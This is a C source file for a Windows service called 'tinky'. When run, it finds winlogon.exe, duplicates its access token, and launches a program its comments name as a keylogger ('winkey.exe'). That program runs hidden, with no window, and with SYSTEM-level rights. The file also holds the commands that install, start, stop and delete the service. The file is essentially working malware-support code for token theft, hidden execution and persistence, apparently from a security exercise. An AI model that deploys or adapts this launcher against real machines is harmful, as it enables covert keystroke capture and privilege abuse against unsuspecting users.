#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "advapi32.lib")

// Disables warning about Spectre mitigation
// code insertion for memory loads
#pragma warning(disable: 5045)
// Disables warning about functions marked
// for inlining that are not actually inlined by the compiler
#pragma warning(disable: 4710)

#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <tlhelp32.h>

// Name of the service used for registration and control.
#define SVC_NAME "tinky"

// Name of the keylogger executable that the service will manage.
#define KEYLOGGER_NAME "winkey.exe"

// Event log identifier for reporting service errors.
#define SVC_ERROR 1

// Global variable to hold the status of the service.
SERVICE_STATUS          g_svc_status;

// Global variable to hold the service control handler.
SERVICE_STATUS_HANDLE   g_svc_status_handle;

// Global event handle used to signal the service to stop.
HANDLE                  g_svc_stop_event = NULL;

// Global handle for the process managed by the service.
HANDLE                  g_process = NULL; // Global handle for the process

static VOID WINAPI svc_ctrl_handler(DWORD);
static VOID report_svc_status(DWORD, DWORD, DWORD);
static HANDLE get_winlogon_duptoken(void);

static VOID WINAPI svc_main(DWORD argc, LPTSTR* argv)
{
    if (argc <= 1)
        return;

    // Register the handler function for the service.
    // This function connects the service to the SCM (Service Control Manager).
    // 'svc_ctrl_handler' is the function that will handle control requests (e.g., stop, pause).
    g_svc_status_handle = RegisterServiceCtrlHandler(
        SVC_NAME,
        svc_ctrl_handler);

    // Check if the registration of the control handler failed.
    if (!g_svc_status_handle)
        return;

    // Initialize the SERVICE_STATUS structure members that will remain constant.
    // 'dwServiceType' indicates the type of service (here, it's a service running in its own process).
    // 'dwServiceSpecificExitCode' is set to 0, meaning no specific exit code is used.
    g_svc_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svc_status.dwServiceSpecificExitCode = 0;

    // Report the initial status of the service to the SCM.
    // This informs the SCM that the service is in the process of starting (SERVICE_START_PENDING).
    // A delay of 3000 milliseconds is provided for the start-up process.
    report_svc_status(SERVICE_START_PENDING, NO_ERROR, 3000);

    // Create an event for service stop notification.
    // 'CreateEvent()' sets up a manual-reset event which will be signaled when the service should stop.
    g_svc_stop_event = CreateEvent(
        NULL,    // Default security attributes
        TRUE,    // Manual reset event
        FALSE,   // Initial state is non-signaled
        NULL);   // No name

    // Check if the event creation failed.
    // If creation fails, report service status as stopped.
    if (g_svc_stop_event == NULL)
    {
        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    // Report service status as running once initialization is complete.
    // This informs the Service Control Manager that the service is now active.
    report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);

    // Attempt to impersonate the winlogon.exe process.
    // 'impersonate_winlogon()' is used to gain the security context of the winlogon process.
    HANDLE dup_token = get_winlogon_duptoken();
    if (!dup_token)
    {
        // Report service status as stopped if impersonation fails.
        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION proc_info = { 0 };

    // Attempt to create a new process using the duplicated token, without showing a window.
    if (!CreateProcessAsUser(dup_token,     // Handle to the duplicated token (used for impersonation)
        NULL,          // Application name (NULL if part of command line)
        argv[1],       // Command line (argv[1] contains the executable path)
        NULL,          // Process security attributes (NULL for default)
        NULL,          // Thread security attributes (NULL for default)
        FALSE,         // Inherit handles flag (FALSE to not inherit)
        CREATE_NO_WINDOW, // Creation flags (CREATE_NO_WINDOW to run without a console window)
        NULL,          // Environment (NULL to use the parent process's environment)
        NULL,          // Current directory (NULL to use the parent process's directory)
        &info,         // Pointer to STARTUPINFO structure
        &proc_info))   // Pointer to PROCESS_INFORMATION structure
    {
        return;
    }
    CloseHandle(dup_token);

    // Wait indefinitely until the stop event is signaled.
    // The service will continue to run until the stop event is set.
    //WaitForSingleObject(g_svc_stop_event, INFINITE);
    WaitForSingleObject(proc_info.hProcess, INFINITE);
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);
    CloseHandle(g_svc_stop_event);

    // Report service status as stopped when the stop event is signaled.
    // This indicates that the service has stopped successfully.
    report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
    return;
}

static BOOL get_winlogon_pid(DWORD* pProcessId)
{
    // Create a snapshot of all processes currently running in the system.
    // 'CreateToolhelp32Snapshot' takes a snapshot for process enumeration.
    // 'TH32CS_SNAPPROCESS' specifies that we want to enumerate processes.
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return FALSE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process in the snapshot.
    // 'Process32First' initializes 'pe' with details of the first process.
    if (Process32First(snapshot, &pe))
    {
        do
        {
            // Compare the process name to "winlogon.exe" (case insensitive).
            // '_tcsicmp' is used for case-insensitive comparison.
            if (_tcsicmp(pe.szExeFile, _T("winlogon.exe")) == 0)
            {
                // If "winlogon.exe" is found, set the process ID.
                // 'pe.th32ProcessID' contains the process ID of the matching process.
                *pProcessId = pe.th32ProcessID;

                // Close the snapshot handle.
                // The handle is no longer needed after the process ID is retrieved.
                CloseHandle(snapshot);
                return TRUE;
            }
        } while (Process32Next(snapshot, &pe)); // Continue to the next process in the snapshot.
    }

    // Close the snapshot handle.
    // Return FALSE if "winlogon.exe" was not found in the snapshot.
    CloseHandle(snapshot);
    return FALSE;
}

static HANDLE get_winlogon_duptoken(void)
{
    DWORD winlogon_pid = 0;

    // Retrieve the process ID of winlogon.exe.
    // 'get_winlogon_pid' is used to find the process ID.
    if (!get_winlogon_pid(&winlogon_pid))
        return NULL;

    // Open the winlogon process with PROCESS_QUERY_INFORMATION access.
    // 'OpenProcess' is used to obtain a handle to the winlogon process.
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogon_pid);
    if (process == NULL) {
        return NULL;
    }

    // Open the access token associated with the winlogon process.
    // 'OpenProcessToken' is used to get the token for the process.
    HANDLE token;
    if (!OpenProcessToken(process, TOKEN_ALL_ACCESS, &token))
    {
        CloseHandle(process);
        return NULL;
    }

    // Duplicate the token to create a primary token with necessary privileges.
    // 'DuplicateTokenEx' creates a new token with the desired access level.
    HANDLE dup_token;
    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup_token))
    {
        CloseHandle(token);
        CloseHandle(process);
        return NULL;
    }

    // Close the handles after successful impersonation.
    // These handles are no longer needed after impersonation.
    CloseHandle(token);
    CloseHandle(process);
    return dup_token;
}

static VOID report_svc_status(DWORD current_state,
    DWORD win32_exit_code,
    DWORD wait_hint)
{
    static DWORD checkpoint = 1;

    // Update the SERVICE_STATUS structure with the current service status.
    // 'current_state' specifies the current state of the service (e.g., running, stopped).
    // 'win32_exit_code' provides the error code if the service fails.
    // 'wait_hint' is a hint to the SCM on how long to wait before checking the status again.
    g_svc_status.dwCurrentState = current_state;
    g_svc_status.dwWin32ExitCode = win32_exit_code;
    g_svc_status.dwWaitHint = wait_hint;

    // Set the controls accepted by the service based on its current state.
    // While the service is starting, it does not accept any controls.
    // Once running or stopped, it only accepts stop control requests.
    if (current_state == SERVICE_START_PENDING)
        g_svc_status.dwControlsAccepted = 0;
    else
        g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    // Set the checkpoint value to indicate progress during start or stop operations.
    // Checkpoint is used to help the SCM track the progress of the service.
    // Reset checkpoint to 0 if the service is running or stopped.
    if ((current_state == SERVICE_RUNNING) ||
        (current_state == SERVICE_STOPPED))
        g_svc_status.dwCheckPoint = 0;
    else
        g_svc_status.dwCheckPoint = checkpoint++;

    // Report the updated service status to the Service Control Manager.
    // This informs the SCM about the current state and progress of the service.
    SetServiceStatus(g_svc_status_handle, &g_svc_status);
}

static void kill_winkey_process(void)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD dwDesiredProcessId = 0;

    // Take a snapshot of all running processes
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return;
    }

    // Initialize the PROCESSENTRY32 structure
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve the first process from the snapshot
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return;
    }

    // Iterate through the list of processes
    do {
        if (strcmp(pe32.szExeFile, "winkey.exe") == 0) {
            dwDesiredProcessId = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    // Close the process snapshot handle
    CloseHandle(hProcessSnap);

    if (dwDesiredProcessId != 0) {
        // Open the process with the necessary rights to terminate it
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwDesiredProcessId);
        if (hProcess == NULL) {
            return;
        }

        // Terminate the process
        TerminateProcess(hProcess, 0);

        // Close the process handle
        CloseHandle(hProcess);
    }
}

static VOID WINAPI svc_ctrl_handler(DWORD ctrl)
{
    // Handle the requested control code sent by the Service Control Manager.
    switch (ctrl)
    {
    case SERVICE_CONTROL_STOP:
        // Report that the service is in the process of stopping.
        report_svc_status(SERVICE_STOP_PENDING, NO_ERROR, 0);

		// Kill the keylogger process before stopping the service.
        kill_winkey_process();

        // Signal the service to stop by setting the stop event.
        // This will cause the service to exit its main loop.
        SetEvent(g_svc_stop_event);

        // Update the service status to indicate that it has stopped.
        report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);

        return;

    case SERVICE_CONTROL_INTERROGATE:
        // This control code is used to request the service status.
        // Typically, no action is needed; the SCM polls the service status automatically.
        break;

    default:
        // Handle other control codes as needed.
        // By default, do nothing for unhandled control codes.
        break;
    }
}

static void print_error(const char* msg)
{
    DWORD err = GetLastError(); // Retrieve the last error code
    LPSTR error_text = NULL;   // Pointer to hold the error message

    // Obtain the error message associated with the error code
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | // Allocate buffer for the message
        FORMAT_MESSAGE_FROM_SYSTEM |     // Retrieve message from system
        FORMAT_MESSAGE_IGNORE_INSERTS,   // Ignore insert parameters in the message
        NULL,                            // No source (use system)
        err,                             // Error code to format
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Language ID
        (LPSTR)&error_text,              // Pointer to receive the error message
        0,                               // Minimum size of the buffer
        NULL                             // No arguments for the message
    );

    // Print the custom error message
    fprintf(stderr, "%s\n", msg);
    if (error_text) {
        // Print the system error message along with the error code
        fprintf(stderr, "Reason: (%lu) %s", err, error_text);
        // Free the memory allocated for the error message
        LocalFree(error_text);
    }
}

static void install_service(SC_HANDLE scm)
{
    TCHAR unquoted_path[MAX_PATH];

    // Retrieve the full path of the executable file for the current module.
    if (!GetModuleFileName(NULL, unquoted_path, MAX_PATH))
    {
        print_error("Failed to get module file name");
        return;
    }

    // Quote the path to handle any spaces in the file path.
    // For example, "d:\my share\myservice.exe" should be specified as
    // "\"d:\\my share\\myservice.exe\"".
    TCHAR path[MAX_PATH];
    StringCbPrintf(path, MAX_PATH, TEXT("\"%s\""), unquoted_path);

    // Create the service using the Service Control Manager handle.
    SC_HANDLE service = CreateService(
        scm,                          // Handle to the Service Control Manager (SCM)
        SVC_NAME,                     // Service name (short name used by the system)
        SVC_NAME,                     // Display name (name shown in the services console)
        SERVICE_ALL_ACCESS,           // Full access rights
        SERVICE_WIN32_OWN_PROCESS,    // Service type: runs in its own process
        SERVICE_DEMAND_START,         // Start type: manual start on demand
        SERVICE_ERROR_NORMAL,         // Error control: log error and continue startup
        path,                         // Path to the service executable
        NULL,                         // Load order group (NULL if not part of a group)
        NULL,                         // Tag ID (NULL if no unique tag is needed)
        NULL,                         // Dependencies (NULL if no dependencies)
        NULL,                         // Service start name (NULL for LocalSystem account)
        NULL                          // Password (NULL if not required)
    );

    // Check if the service creation failed.
    // If successful, print a success message; otherwise, print an error.
    if (service == NULL) {
        print_error("Failed to create service");
    }
    else {
        printf("Service installed successfully\n");
        CloseServiceHandle(service);
    }

    // Close the handle to the Service Control Manager.
    CloseServiceHandle(scm);
}

static void start_service(SC_HANDLE scm)
{
    // Open a handle to the specified service with full access rights.
    // This handle is used to interact with the service (e.g., start, stop).
    SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (service == NULL) {
        print_error("Failed to open service");
        CloseServiceHandle(scm);
        return;
    }

    char keylogger_path[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, keylogger_path, MAX_PATH);

    // Find the last backslash in the path to isolate the directory portion.
    char* last_backslash = strrchr(keylogger_path, '\\');
    if (last_backslash) {
        *last_backslash = '\0';
    }

    // Construct the full path to winkey.exe by appending its name to the directory path.
    snprintf(keylogger_path, MAX_PATH, "%s\\" KEYLOGGER_NAME, keylogger_path);

    // Attempt to start the service.
    // The function StartService does not return until the service is either running or in a start-pending state.
    const char* args[] = { keylogger_path };
    if (!StartService(service, 1, args)) {
        print_error("Failed to start service");
    }
    else {
        printf("Service started succesfully\n");
    }

    // Close the handles to the service and SCM once operations are complete.
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}

static void stop_service(SC_HANDLE scm)
{
    // Open a handle to the specified service with stop rights.
    // This handle is used to interact with the service (specifically, to stop it).
    SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_STOP);
    if (service == NULL) {
        print_error("Failed to open service");
        CloseServiceHandle(scm);
        return;
    }

    // Attempt to stop the service.
    // The ControlService function sends a control code (SERVICE_CONTROL_STOP) to the service to stop it.
    SERVICE_STATUS status;
    if (!ControlService(service, SERVICE_CONTROL_STOP, &status)) {
        print_error("Failed to stop service");
    }
    else {
        printf("Service stopped successfully\n");
    }

    // Close the handles to the service and SCM once operations are complete.
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}

static BOOL is_service_running(SC_HANDLE service)
{
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytes_needed;

    // Query the status of the service to determine if it is running.
    // QueryServiceStatusEx retrieves detailed status information about the service.
    if (!QueryServiceStatusEx(
        service,                          // Handle to the service
        SC_STATUS_PROCESS_INFO,           // Information level, retrieves process information
        (LPBYTE)&ssp,                     // Buffer to receive the status information
        sizeof(SERVICE_STATUS_PROCESS),   // Size of the buffer
        &bytes_needed))                   // Number of bytes needed if buffer is too small
    {
        // If QueryServiceStatusEx fails, log the error and return FALSE.
        print_error("Failed to query the service status");
        return FALSE;
    }

    // Check if the service is currently running.
    return (ssp.dwCurrentState == SERVICE_RUNNING);
}

static void delete_service(SC_HANDLE scm)
{
    // Open a handle to the specified service with all access rights.
    // This handle is used to delete the service.
    SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (service == NULL) {
        // Log an error if opening the service fails.
        print_error("Failed to open service");
        CloseServiceHandle(scm);
        return;
    }

    // Check if the service is currently running.
    // If it is, stop the service before attempting to delete it.
    if (is_service_running(service)) {
        stop_service(scm);
    }

    // Attempt to delete the service.
    // If DeleteService fails, log an error; otherwise, confirm successful deletion.
    if (!DeleteService(service)) {
        print_error("Failed to delete service");
    }
    else {
        printf("Service deleted successfully\n");
    }

    // Close the handles to the service and the Service Control Manager.
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}

int main(int argc, char* argv[])
{
    // Check if no command-line arguments are provided.
    // In this case, the program runs as a Windows service.
    if (argc < 2) {
        SERVICE_TABLE_ENTRY dispatch_table[] =
        {
            { SVC_NAME, (LPSERVICE_MAIN_FUNCTION)svc_main },  // Register the service entry point
            { NULL, NULL }  // End of table
        };

        // Start the service control dispatcher. This function blocks until the service stops.
        StartServiceCtrlDispatcher(dispatch_table);
        return 0;  // Exit the program after the service stops
    }

    // Open a handle to the Service Control Manager (SCM) with full access rights.
    // The SCM manages the services on the local machine.
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == NULL) {
        print_error("Failed to open service manager");
        return;
    }

    // Command-line arguments are present, indicating a service management operation.
    // Perform the appropriate operation based on the argument provided.
    if (strcmp(argv[1], "install") == 0) {
        install_service(scm);  // Install the service
    }
    else if (strcmp(argv[1], "start") == 0) {
        start_service(scm);  // Start the service
    }
    else if (strcmp(argv[1], "stop") == 0) {
        stop_service(scm);  // Stop the service
    }
    else if (strcmp(argv[1], "delete") == 0) {
        delete_service(scm);  // Delete the service
    }
    else {
        // If the argument is invalid, print the usage message and return an error code.
        printf("Invalid option. Usage: svc <install|start|stop|delete>\n");
        return 1;
    }

    return 0;  // Exit the program successfully
}
